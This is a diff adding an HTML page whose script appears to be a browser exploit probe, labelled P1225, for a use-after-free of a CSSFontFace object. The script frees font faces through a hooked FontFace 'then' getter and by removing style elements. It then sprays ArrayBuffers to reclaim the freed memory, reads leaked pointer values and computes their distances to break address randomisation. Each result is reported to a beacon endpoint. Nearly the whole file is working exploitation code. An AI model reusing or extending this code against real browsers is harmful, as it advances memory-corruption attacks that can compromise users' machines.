@@ -1,0 +1,365 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1225 render path access</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+#testdiv{position:absolute;top:500px;left:10px;font-size:48px;color:#222}
+</style>
+</head><body>
+<div id="s">P1225 BOOTING...</div>
+<div id="r"></div>
+<div id="testdiv">AB</div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1225: Render path CSSFontFace access + feature detection
+
+   HYPOTHESIS: The font renderer (not JS wrapper) may access the
+   freed CSSFontFace through cached glyph/metric data. If text was
+   rendered in font "s0" BEFORE freeing, re-rendering might touch
+   our buffer.
+
+   ALSO: Feature detection for WebGL, Workers, AudioContext.
+   ALSO: CSS rule object access — does cssRules[0] hold a ref?
+   ALSO: Multi-CSSFontFace reclaim — free multiple faces, get
+   relative addresses to compute self-address.
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r'),TD=document.getElementById('testdiv');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1225-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+
+B('START','render-path-access');
+S.textContent='P1225: RENDER PATH + FEATURES...';
+msg('=== P1225: Render path access + feature detection ===');
+msg('');
+
+/* ═══════ FEATURE DETECTION ═══════ */
+var features={};
+try{features.webgl=!!document.createElement('canvas').getContext('webgl');}catch(e){features.webgl=false;}
+try{features.webgl2=!!document.createElement('canvas').getContext('webgl2');}catch(e){features.webgl2=false;}
+try{features.audio=!!(window.AudioContext||window.webkitAudioContext);}catch(e){features.audio=false;}
+try{features.worker=!!window.Worker;}catch(e){features.worker=false;}
+try{features.sharedworker=!!window.SharedWorker;}catch(e){features.sharedworker=false;}
+try{features.serviceworker=!!navigator.serviceWorker;}catch(e){features.serviceworker=false;}
+try{features.wasm=!!window.WebAssembly;}catch(e){features.wasm=false;}
+try{features.offscreen=!!window.OffscreenCanvas;}catch(e){features.offscreen=false;}
+try{features.createImageBitmap=!!window.createImageBitmap;}catch(e){features.createImageBitmap=false;}
+try{features.resizeObserver=!!window.ResizeObserver;}catch(e){features.resizeObserver=false;}
+try{features.intersectionObserver=!!window.IntersectionObserver;}catch(e){features.intersectionObserver=false;}
+try{features.mutationObserver=!!window.MutationObserver;}catch(e){features.mutationObserver=false;}
+try{features.perf=!!window.performance&&!!window.performance.now;}catch(e){features.perf=false;}
+try{features.crypto=!!window.crypto&&!!window.crypto.subtle;}catch(e){features.crypto=false;}
+try{features.textEncoder=!!window.TextEncoder;}catch(e){features.textEncoder=false;}
+try{features.textDecoder=!!window.TextDecoder;}catch(e){features.textDecoder=false;}
+try{features.structuredClone=!!window.structuredClone;}catch(e){features.structuredClone=false;}
+try{features.messageChannel=!!window.MessageChannel;}catch(e){features.messageChannel=false;}
+
+var featStr=[];
+for(var k in features)featStr.push(k+'='+(features[k]?'Y':'N'));
+B('FEATURES',featStr.join('|'));
+msg('features: '+featStr.join(' '));
+msg('');
+
+/* ═══════ EXP A: Render text in CSS font BEFORE freeing ═══════ */
+msg('=== EXP A: Render path test ===');
+
+/* Create CSS @font-face and render text */
+var styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:'rfont';src:local(Arial);unicode-range:U+0041-007A;}";
+document.head.appendChild(styleEl);
+TD.style.fontFamily="'rfont', serif";
+TD.textContent="ABCDEF"; /* force rendering in rfont */
+document.body.offsetHeight; /* force layout */
+
+/* Also create JS FontFace for the then-getter trigger */
+var A0=new FontFace('trigger','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(A0);
+void A0.loaded;
+window.__alive=[A0];
+
+/* Get CSS rule reference BEFORE removal */
+var cssRule=null;
+try{
+  var rules=styleEl.sheet.cssRules;
+  if(rules&&rules.length>0)cssRule=rules[0];
+  B('CSS-RULE','type='+cssRule.type+'|cssText='+(cssRule.cssText||'none').slice(0,100));
+  msg('CSS rule: type='+cssRule.type);
+}catch(e){
+  B('CSS-RULE-ERR',e.message);
+}
+
+var K=8,SIZE=192;
+var firedS1=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedS1)return undefined;
+    firedS1=true;
+    /* Free the CSS @font-face by removing style */
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    styleEl=null;
+    document.body.offsetHeight;
+    /* Reclaim */
+    window.__map1=[];
+    for(var k=0;k<K;k++){
+      var ab=new ArrayBuffer(SIZE);
+      window.__map1.push({view:new Uint8Array(ab),bv:new BigUint64Array(ab),ab:ab});
+    }
+    try{document.fonts.check('1em rfont');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+
+document.fonts.load('1em trigger, rfont','AB').then(function(){
+  B('S1-OK','resolved');
+},function(){});
+
+setTimeout(function(){
+  var m=window.__map1;
+  if(!m||!m.length){B('S1-NOMAP','err');doExpB();return;}
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>nz){nz=n;best=i;}
+  }
+  if(best<0){B('S1-CLEAN','no-hit');doExpB();return;}
+
+  var tv=m[best].view;
+  var s1data=new Uint8Array(SIZE);
+  for(var i=0;i<SIZE;i++)s1data[i]=tv[i];
+
+  var p58='';for(var i=0;i<8;i++)p58+=hex(s1data[0x58+i]);
+  var p68='';for(var i=0;i<8;i++)p68+=hex(s1data[0x68+i]);
+  B('S1-HIT','buf'+best+'|p58='+p58+'|p68='+p68);
+  msg('S1 HIT: p58='+p58+' p68='+p68);
+
+  /* Set unique sentinel pattern for detection */
+  for(var i=0;i<SIZE;i++)tv[i]=0;
+  tv[0]=0xAA;tv[1]=0xBB;tv[2]=0xCC;tv[3]=0xDD;
+  for(var i=4;i<SIZE;i+=4){
+    tv[i]=(i/4)&0xFF;
+    tv[i+1]=0xFE;
+  }
+  var snap=new Uint8Array(SIZE);
+  for(var i=0;i<SIZE;i++)snap[i]=tv[i];
+
+  /* ═══ TEST 1: Re-render text in rfont ═══ */
+  TD.style.fontFamily="'rfont', serif";
+  TD.textContent="GHIJKL";
+  document.body.offsetHeight;
+
+  var diffs1=[];
+  for(var i=0;i<SIZE;i++)if(tv[i]!==snap[i])diffs1.push('+0x'+hex(i)+'='+hex(snap[i])+'->'+hex(tv[i]));
+  B('RENDER-TEST',diffs1.length>0?diffs1.join(','):'CLEAN');
+  msg('after re-render: '+(diffs1.length>0?diffs1.join(' '):'CLEAN'));
+
+  /* ═══ TEST 2: Access CSS rule after removal ═══ */
+  if(cssRule){
+    var ruleData=[];
+    try{ruleData.push('cssText='+cssRule.cssText);}catch(e){ruleData.push('cssText=ERR:'+e.message);}
+    try{ruleData.push('type='+cssRule.type);}catch(e){ruleData.push('type=ERR:'+e.message);}
+    try{ruleData.push('style.ff='+cssRule.style.fontFamily);}catch(e){ruleData.push('style.ff=ERR:'+e.message);}
+    B('CSS-RULE-POST',ruleData.join('|'));
+    msg('rule after removal: '+ruleData.join(' '));
+
+    /* Did rule access touch our buffer? */
+    var diffs2=[];
+    for(var i=0;i<SIZE;i++)if(tv[i]!==snap[i])diffs2.push('+0x'+hex(i)+'='+hex(snap[i])+'->'+hex(tv[i]));
+    B('RULE-TOUCH',diffs2.length>0?diffs2.join(','):'CLEAN');
+    msg('rule access diffs: '+(diffs2.length>0?diffs2.join(' '):'CLEAN'));
+
+    /* Try to SET a property on the rule */
+    try{
+      cssRule.style.fontFamily="'hacked'";
+      B('RULE-WRITE','ok');
+    }catch(e){
+      B('RULE-WRITE-ERR',e.message);
+    }
+    var diffs3=[];
+    for(var i=0;i<SIZE;i++)if(tv[i]!==snap[i])diffs3.push('+0x'+hex(i)+'='+hex(snap[i])+'->'+hex(tv[i]));
+    B('RULE-WRITE-TOUCH',diffs3.length>0?diffs3.join(','):'CLEAN');
+    msg('rule write diffs: '+(diffs3.length>0?diffs3.join(' '):'CLEAN'));
+  }
+
+  /* ═══ TEST 3: Canvas measureText with rfont ═══ */
+  var cvs=document.createElement('canvas');
+  cvs.width=200;cvs.height=50;
+  var ctx=cvs.getContext('2d');
+  ctx.font="48px 'rfont', serif";
+  var tm=ctx.measureText('ABC');
+  B('CANVAS-MEASURE','w='+tm.width);
+  msg('canvas measureText w='+tm.width);
+
+  var diffs4=[];
+  for(var i=0;i<SIZE;i++)if(tv[i]!==snap[i])diffs4.push('+0x'+hex(i)+'='+hex(snap[i])+'->'+hex(tv[i]));
+  B('CANVAS-TOUCH',diffs4.length>0?diffs4.join(','):'CLEAN');
+  msg('canvas measure diffs: '+(diffs4.length>0?diffs4.join(' '):'CLEAN'));
+
+  /* ═══ TEST 4: getComputedStyle with rfont ═══ */
+  var comp=window.getComputedStyle(TD);
+  var ff=comp.fontFamily;
+  B('COMPUTED-FONT','ff='+ff);
+  msg('computed font-family: '+ff);
+
+  var diffs5=[];
+  for(var i=0;i<SIZE;i++)if(tv[i]!==snap[i])diffs5.push('+0x'+hex(i)+'='+hex(snap[i])+'->'+hex(tv[i]));
+  B('COMPUTED-TOUCH',diffs5.length>0?diffs5.join(','):'CLEAN');
+
+  doExpB();
+
+},200);
+
+/* ═══════ EXP B: Multi-reclaim for relative addressing ═══════ */
+function doExpB(){
+  msg('');msg('=== EXP B: Multi CSSFontFace reclaim ===');
+
+  /* Create 4 CSS @font-face rules, each in own style element */
+  var styles=[];
+  var jsFaces=[];
+  var reclaimed=[];
+
+  for(var i=0;i<4;i++){
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:'m"+i+"';src:local(Arial);unicode-range:U+004"+(i+1)+";}";
+    document.head.appendChild(st);
+
+    var jf=new FontFace('jf'+i,'local(Helvetica)',{unicodeRange:'U+004'+(i+1)});
+    document.fonts.add(jf);
+    void jf.loaded;
+
+    styles.push(st);
+    jsFaces.push(jf);
+    window.__alive.push(jf);
+  }
+  B('MULTI-SETUP','4-fonts');
+
+  /* Free ALL CSS-side faces at once */
+  for(var i=0;i<4;i++){
+    styles[i].remove();
+    try{document.fonts.delete(jsFaces[i]);}catch(e){}
+  }
+  document.body.offsetHeight;
+
+  /* Spray 32 buffers × 192 bytes */
+  var multiMap=[];
+  for(var k=0;k<32;k++){
+    var ab=new ArrayBuffer(SIZE);
+    multiMap.push({view:new Uint8Array(ab),bv:new BigUint64Array(ab)});
+  }
+
+  /* Find all hit buffers */
+  var hits=[];
+  for(var i=0;i<multiMap.length;i++){
+    var v=multiMap[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>0){
+      var p58='';for(var j=0;j<8;j++)p58+=hex(v[0x58+j]);
+      var p68='';for(var j=0;j<8;j++)p68+=hex(v[0x68+j]);
+      hits.push({idx:i,nz:n,p58:p58,p68:p68});
+    }
+  }
+
+  B('MULTI-HITS','count='+hits.length);
+  msg('multi reclaim: '+hits.length+' hits');
+
+  for(var i=0;i<hits.length;i++){
+    var h=hits[i];
+    B('MULTI-HIT-'+i,'buf'+h.idx+'|nz='+h.nz+'|p58='+h.p58+'|p68='+h.p68);
+    msg('  buf'+h.idx+': p58='+h.p58+' p68='+h.p68);
+  }
+
+  /* Analyze distances between p58 values */
+  if(hits.length>=2){
+    var p58vals=[];
+    for(var i=0;i<hits.length;i++){
+      var bv=multiMap[hits[i].idx].bv;
+      p58vals.push(bv[0x58/8]);
+    }
+    var dists=[];
+    for(var i=1;i<p58vals.length;i++){
+      var d=p58vals[i]-p58vals[i-1];
+      dists.push('d'+i+'='+d.toString());
+    }
+    B('MULTI-DIST',dists.join('|'));
+    msg('p58 distances: '+dists.join(' '));
+  }
+
+  /* ═══ EXP C: Worker test ═══ */
+  msg('');msg('=== EXP C: Worker test ===');
+  if(features.worker){
+    try{
+      var blob=new Blob(['self.postMessage("alive")'],{type:'application/javascript'});
+      var url=URL.createObjectURL(blob);
+      var w=new Worker(url);
+      w.onmessage=function(e){
+        B('WORKER-MSG',e.data);
+        msg('worker says: '+e.data);
+        w.terminate();
+      };
+      w.onerror=function(e){
+        B('WORKER-ERR',e.message||'unknown');
+        msg('worker error: '+(e.message||'unknown'));
+      };
+      setTimeout(function(){
+        B('WORKER-TIMEOUT','no-msg');
+        msg('worker: no response after 2s');
+      },2000);
+    }catch(e){
+      B('WORKER-CREATE-ERR',e.message);
+      msg('worker create error: '+e.message);
+    }
+  }else{
+    B('WORKER-NONE','not-available');
+    msg('Worker: not available');
+  }
+
+  /* ═══ EXP D: MessageChannel ═══ */
+  if(features.messageChannel){
+    try{
+      var mc=new MessageChannel();
+      var mcGot=false;
+      mc.port1.onmessage=function(e){
+        mcGot=true;
+        B('MSGCHAN-OK','data='+e.data);
+        msg('MessageChannel: works');
+      };
+      mc.port2.postMessage('test');
+      setTimeout(function(){
+        if(!mcGot){B('MSGCHAN-SILENT','no-msg');msg('MessageChannel: silent');}
+      },500);
+    }catch(e){
+      B('MSGCHAN-ERR',e.message);
+    }
+  }
+
+  setTimeout(finalize,3000);
+}
+
+function finalize(){
+  msg('');msg('=== P1225 COMPLETE ===');
+  S.textContent='P1225 COMPLETE';
+  B('DONE','all');
+}
+
+setTimeout(finalize,30000);
+</script>
+</body></html>
